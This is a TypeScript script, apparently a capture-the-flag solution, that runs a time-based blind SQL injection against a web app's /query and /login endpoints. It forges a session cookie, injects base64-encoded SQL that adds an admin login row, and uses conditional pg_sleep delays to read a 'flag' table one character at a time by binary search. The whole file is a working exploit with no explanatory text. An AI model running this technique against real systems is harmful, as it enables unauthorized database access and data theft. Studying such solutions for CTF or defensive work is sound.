import fetch from "node-fetch";
import AbortController from "abort-controller";

if (process.argv.length < 3) {
    console.log("Usage: yarn start <target uri>")
    process.exit(1);
}
const target = process.argv[2];

const tryExp = async (exp: string) => {
    let query = Buffer.from(`
INSERT INTO _pgui.login (id, username)
SELECT nextval('_pgui.login_id_seq')+1, 'admin';

SELECT pg_sleep (
    CASE WHEN (${exp}) THEN 2 ELSE 0 END
);
    `).toString("base64");

    const controller = new AbortController();

    (async () => {
        try {
            await fetch(target + "/query", {
                method: "POST",
                headers: {
                    "cookie": "user=zach.is.cool",
                    "content-type": "application/json",
                },
                signal: controller.signal,
                body: JSON.stringify({ query }),
            });
        } catch (e) {
            // pass
        }
    })()

    let start = Date.now();

    await fetch(target + "/login", {
        method: "POST",
        headers: {
            "content-type": "application/json",
        },
        body: JSON.stringify({ username: "admin", password: "foo" }),
    });

    let end = Date.now();

    controller.abort();

    if (end - start > 1000) {
        return true;
    } else {
        return false;
    }
}

const binCond = async (chr: number, mid: number) => {
    let exp = `(ascii(substr((select flag from flag), ${chr}, 1))) < ${mid}`;

    // There's a bit of a race, but fortunately it only goes in the direction of
    // false negatives, so we just try 3 times for stability
    return (await tryExp(exp)) || (await tryExp(exp)) || (await tryExp(exp));
}

const binSearch = async (pos: number) => {
    let lower = 0;
    let upper = 256;

    while (upper - lower > 1) {
        let mid = Math.floor((upper - lower) / 2) + lower;
        let result = await binCond(pos, mid)
        if (result) {
            upper = mid;
        } else {
            lower = mid;
        }
    }

    return String.fromCharCode(lower);
}

const main = async() => {
    let result = ""
    while (true) {
        result += await binSearch(result.length + 1);
        console.log(result);
    }
}

main();